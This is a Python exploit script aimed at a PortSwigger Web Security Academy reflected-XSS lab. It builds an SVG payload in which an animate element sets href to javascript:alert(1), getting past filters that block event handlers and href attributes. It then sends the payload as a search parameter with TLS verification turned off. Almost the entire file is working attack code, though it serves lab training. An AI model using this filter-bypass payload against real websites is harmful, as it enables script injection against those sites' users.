#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Script: Reflected XSS with event handlers and href attributes blocked

This script targets a PortSwigger Web Security Academy lab scenario where only certain tags
are whitelisted, event handlers and href attributes are blocked. The goal is to inject
a clickable payload using <svg> with <animate> to trigger an alert.

Steps:
  1. Input LAB_URL via user input.
  2. Optionally configure Burp Proxy.
  3. Generate a payload with an SVG containing animate with a JavaScript payload.
  4. Send a GET request with the payload.
"""

import requests
from colorama import init, Fore, Style
import urllib.parse
import urllib3

# Initialize colorama for colored terminal output
init(autoreset=True)

# Disable SSL warnings for Burp Proxy interception
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_lab_url_and_proxy():
    """
    Prompt the user to enter the lab URL and proxy settings if needed.
    """
    lab_url = input(f"{Fore.CYAN}Enter the LAB URL (e.g., https://YOUR-LAB-ID.web-security-academy.net): {Style.RESET_ALL}").strip()

    use_proxy = input(f"{Fore.MAGENTA}Do you want to use a Burp Proxy? (y/n): {Style.RESET_ALL}").strip().lower()
    if use_proxy == 'y':
        proxy_host = input(f"{Fore.CYAN}Enter proxy host (default: 127.0.0.1): {Style.RESET_ALL}").strip() or "127.0.0.1"
        proxy_port = input(f"{Fore.CYAN}Enter proxy port (default: 8080): {Style.RESET_ALL}").strip() or "8080"
        proxy_url = f"http://{proxy_host}:{proxy_port}"
        burp_proxy = {"http": proxy_url, "https": proxy_url}
        print(f"{Fore.GREEN}[+] Proxy set to: {proxy_url}{Style.RESET_ALL}")
    else:
        burp_proxy = None
        print(f"{Fore.YELLOW}[!] No proxy will be used.{Style.RESET_ALL}")

    return lab_url, burp_proxy


def build_payload():
    """
    Construct the payload using an SVG with animate attribute to bypass the restrictions.
    """
    payload = (
        '<svg>'
        '<a>'
        '<animate attributeName=href values=javascript:alert(1) />'
        '<text x=20 y=20>Click me</text>'
        '</a>'
        '</svg>'
    )
    encoded_payload = urllib.parse.quote(payload)
    return encoded_payload


def deliver_exploit(lab_url: str, payload: str, burp_proxy=None):
    """
    Deliver the XSS payload by sending a GET request with the malicious search parameter.
    """
    exploit_url = f"{lab_url}/?search={payload}"
    print(f"{Fore.YELLOW}[*] Sending payload to: {exploit_url}{Style.RESET_ALL}")

    try:
        response = requests.get(exploit_url, verify=False, proxies=burp_proxy)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Payload successfully delivered!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[✓] The lab should now be marked as solved.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to deliver payload. Status Code: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Response: {response.text[:500]}{Style.RESET_ALL}")

    except requests.RequestException as e:
        print(f"{Fore.RED}[!] An error occurred while delivering the exploit: {e}{Style.RESET_ALL}")


def main():
    print(f"{Fore.CYAN}=== Reflected XSS Exploit Script ==={Style.RESET_ALL}")

    # Step 1: Get lab URL and optional proxy settings
    lab_url, burp_proxy = get_lab_url_and_proxy()

    # Step 2: Build the payload
    payload = build_payload()

    # Step 3: Deliver the exploit
    deliver_exploit(lab_url, payload, burp_proxy)


if __name__ == "__main__":
    main()
